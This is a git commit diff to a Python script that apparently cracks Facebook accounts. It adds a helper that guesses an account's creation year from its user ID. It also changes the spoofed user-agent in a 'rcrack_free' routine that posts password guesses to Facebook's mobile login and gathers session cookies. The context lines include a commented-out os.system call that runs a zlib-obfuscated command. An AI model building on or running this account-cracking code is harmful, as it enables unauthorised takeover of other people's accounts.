a489f4efe664c412bb2c58faa4c1b46e05ec703a
zacey69 <154065564+zacey69@users.noreply.github.com>
2023-12-27 03:31:57 +0800

    Update zack.py

--- zack.py
+++ zack.py
@@ -93,6 +93,71 @@ pcp=[]
 id=[]
 tokenku=[]
 
+def 年(uid):
+    D = "20??"
+    E = "2023"
+    C = "2009"
+    B = uid
+    if len(B) == 15:
+        if str(B)[:10] in ["1000000000"]:
+            A = C
+        elif str(B)[:9] in ["100000000"]:
+            A = C
+        elif str(B)[:8] in ["10000000"]:
+            A = C
+        elif str(B)[:7] in [
+            "1000000",
+            "1000001",
+            "1000002",
+            "1000003",
+            "1000004",
+            "1000005",
+        ]:
+            A = C
+        elif str(B)[:7] in ["1000006", "1000007", "1000008", "1000009"]:
+            A = "2010"
+        elif str(B)[:6] in ["100001"]:
+            A = "2010-2011"
+        elif str(B)[:6] in ["100002", "100003"]:
+            A = "2011-2012"
+        elif str(B)[:6] in ["100004"]:
+            A = "2012-2013"
+        elif str(B)[:6] in ["100005", "100006"]:
+            A = "2013-2014"
+        elif str(B)[:6] in ["100007", "100008"]:
+            A = "2014-2015"
+        elif str(B)[:6] in ["100009"]:
+            A = "2015"
+        elif str(B)[:5] in ["10001"]:
+            A = "2015-2016"
+        elif str(B)[:5] in ["10002"]:
+            A = "2016-2017"
+        elif str(B)[:5] in ["10003"]:
+            A = "2018-2019"
+        elif str(B)[:5] in ["10004"]:
+            A = "2019-2020"
+        elif str(B)[:5] in ["10005"]:
+            A = "2020"
+        elif str(B)[:5] in ["10006", "10007"]:
+            A = "2021"
+        elif str(B)[:5] in ["10008"]:
+            A = "2022"
+        elif str(B)[:5] in ["10009"]:
+            A = E
+        else:
+            A = D
+    elif len(B) == 14:
+        A = E
+    elif len(B) in [9, 10]:
+        A = " 2008-2009 "
+    elif len(B) == 8:
+        A = " 2007-2008 "
+    elif len(B) == 7:
+        A = " 2006-2007 "
+    else:
+        A = D
+    return A
+
 def fucked():
 	print(' Server Loadin.......')
 	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
@@ -550,7 +615,7 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}
+			'user-agent': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36'}
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
